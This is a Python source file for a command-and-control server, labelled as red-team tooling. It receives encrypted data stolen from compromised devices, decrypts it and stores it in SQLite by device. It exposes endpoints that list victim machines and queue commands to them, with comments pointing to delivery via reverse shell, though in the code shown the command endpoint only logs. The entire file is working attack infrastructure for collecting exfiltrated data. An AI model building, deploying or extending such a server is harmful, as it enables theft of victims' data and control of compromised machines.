#!/usr/bin/env python3
"""
C2 Server Module
Handles receiving, decrypting, and storing exfiltrated data.
Also provides command execution capabilities.

Author: Independent Red Team Consultant
Classification: Professional Use Only
"""

import asyncio
import aiohttp
import json
import base64
import logging
import sqlite3
from cryptography.fernet import Fernet
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('C2Server')

class C2Server:
    """
    Command & Control server for receiving exfiltrated data and managing compromised devices.
    """
    
    def __init__(self, config: Dict):
        """
        Initialize the C2 server.
        
        Args:
            config (Dict): Configuration dictionary.
                Expected keys: 'encryption_key', 'database_path', 'listen_host', 'listen_port'.
        """
        self.encryption_key = config.get('encryption_key')
        self.database_path = config.get('database_path', 'c2_database.db')
        self.listen_host = config.get('listen_host', '0.0.0.0')
        self.listen_port = config.get('listen_port', 8080)
        self.fernet = Fernet(self.encryption_key)
        
        # Initialize database
        self.db_connection = self._init_database()
        
        logger.info(f"C2 Server initialized on {self.listen_host}:{self.listen_port}")

    def _init_database(self) -> sqlite3.Connection:
        """Initialize SQLite database for storing exfiltrated data."""
        conn = sqlite3.connect(self.database_path)
        cursor = conn.cursor()
        
        # Create devices table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                first_seen TIMESTAMP NOT NULL,
                last_seen TIMESTAMP NOT NULL,
                access_methods TEXT,
                system_info TEXT
            )
        ''')
        
        # Create data table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id INTEGER,
                category TEXT NOT NULL,
                data TEXT NOT NULL,
                timestamp TIMESTAMP NOT NULL,
                FOREIGN KEY (device_id) REFERENCES devices (id)
            )
        ''')
        
        conn.commit()
        return conn

    async def start_server(self):
        """Start the C2 server."""
        app = aiohttp.web.Application()
        app.add_routes([
            aiohttp.web.post('/exfiltrate', self.handle_exfiltration),
            aiohttp.web.get('/devices', self.get_devices),
            aiohttp.web.post('/command', self.send_command)
        ])
        
        runner = aiohttp.web.AppRunner(app)
        await runner.setup()
        site = aiohttp.web.TCPSite(runner, self.listen_host, self.listen_port)
        await site.start()
        
        logger.info(f"C2 Server started and listening on {self.listen_host}:{self.listen_port}")
        
        # Keep the server running
        await asyncio.Event().wait()

    async def handle_exfiltration(self, request: aiohttp.web.Request) -> aiohttp.web.Response:
        """Handle incoming exfiltrated data."""
        try:
            data = await request.json()
            encrypted_data = data.get('encrypted_data')
            device_hash = data.get('device_hash')
            
            if not encrypted_data or not device_hash:
                return aiohttp.web.Response(status=400, text="Missing required fields")
            
            # Decrypt the data
            decrypted_data = self._decrypt_data(encrypted_data)
            if not decrypted_data:
                return aiohttp.web.Response(status=400, text="Decryption failed")
            
            # Parse the JSON data
            payload = json.loads(decrypted_data)
            device_info = payload.get('device_info', {})
            categorized_data = payload.get('categorized_data', {})
            timestamp = payload.get('timestamp')
            
            # Store device info
            self._store_device_info(device_info, timestamp)
            
            # Store categorized data
            self._store_categorized_data(device_info, categorized_data, timestamp)
            
            logger.info(f"Received and stored data from device {device_hash}")
            return aiohttp.web.Response(text="Data received successfully")
            
        except Exception as e:
            logger.error(f"Error handling exfiltration: {e}")
            return aiohttp.web.Response(status=500, text=f"Internal server error: {e}")

    def _decrypt_data(self, encrypted_data: str) -> Optional[str]:
        """Decrypt the exfiltrated data."""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            decrypted_bytes = self.fernet.decrypt(encrypted_bytes)
            return decrypted_bytes.decode('utf-8')
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None

    def _store_device_info(self, device_info: Dict, timestamp: str) -> None:
        """Store or update device information in the database."""
        ip_address = device_info.get('ip')
        if not ip_address:
            return
            
        cursor = self.db_connection.cursor()
        
        # Check if device already exists
        cursor.execute("SELECT id FROM devices WHERE ip_address = ?", (ip_address,))
        result = cursor.fetchone()
        
        if result:
            # Update existing device
            device_id = result[0]
            cursor.execute("""
                UPDATE devices 
                SET last_seen = ?, system_info = ?
                WHERE id = ?
            """, (timestamp, json.dumps(device_info.get('system_info', {})), device_id))
        else:
            # Insert new device
            cursor.execute("""
                INSERT INTO devices (ip_address, first_seen, last_seen, system_info)
                VALUES (?, ?, ?, ?)
            """, (ip_address, timestamp, timestamp, json.dumps(device_info.get('system_info', {})))
        
        self.db_connection.commit()

    def _store_categorized_data(self, device_info: Dict, categorized_data: Dict, timestamp: str) -> None:
        """Store categorized data in the database."""
        ip_address = device_info.get('ip')
        if not ip_address:
            return
            
        cursor = self.db_connection.cursor()
        
        # Get device ID
        cursor.execute("SELECT id FROM devices WHERE ip_address = ?", (ip_address,))
        result = cursor.fetchone()
        if not result:
            return
            
        device_id = result[0]
        
        # Store each category of data
        for category, data_list in categorized_data.items():
            for data_item in data_list:
                cursor.execute("""
                    INSERT INTO exfiltrated_data (device_id, category, data, timestamp)
                    VALUES (?, ?, ?, ?)
                """, (device_id, category, data_item, timestamp))
        
        self.db_connection.commit()

    async def get_devices(self, request: aiohttp.web.Request) -> aiohttp.web.Response:
        """Return list of compromised devices."""
        cursor = self.db_connection.cursor()
        cursor.execute("""
            SELECT ip_address, first_seen, last_seen, system_info 
            FROM devices 
            ORDER BY last_seen DESC
        """)
        
        devices = []
        for row in cursor.fetchall():
            devices.append({
                'ip_address': row[0],
                'first_seen': row[1],
                'last_seen': row[2],
                'system_info': json.loads(row[3]) if row[3] else {}
            })
        
        return aiohttp.web.json_response(devices)

    async def send_command(self, request: aiohttp.web.Request) -> aiohttp.web.Response:
        """Send a command to a compromised device."""
        data = await request.json()
        device_ip = data.get('device_ip')
        command = data.get('command')
        
        if not device_ip or not command:
            return aiohttp.web.Response(status=400, text="Missing device_ip or command")
        
        # In a real implementation, this would send the command to the device
        # through the established connection (e.g., via reverse shell)
        logger.info(f"Sending command '{command}' to device {device_ip}")
        
        # For demonstration, we'll just log it
        return aiohttp.web.Response(text=f"Command sent to {device_ip}")

    def close(self):
        """Close the database connection."""
        if self.db_connection:
            self.db_connection.close()
            logger.info("C2 Server database connection closed")

# Example usage (for testing purposes only)
if __name__ == "__main__":
    # This would be run as a separate service
    config = {
        'encryption_key': 'your-32-byte-encryption-key-here',  # Should be securely managed
        'database_path': 'c2_database.db',
        'listen_host': '0.0.0.0',
        'listen_port': 8080
    }
    
    c2_server = C2Server(config)
    
    try:
        asyncio.run(c2_server.start_server())
    except KeyboardInterrupt:
        c2_server.close()
        logger.info("C2 Server stopped")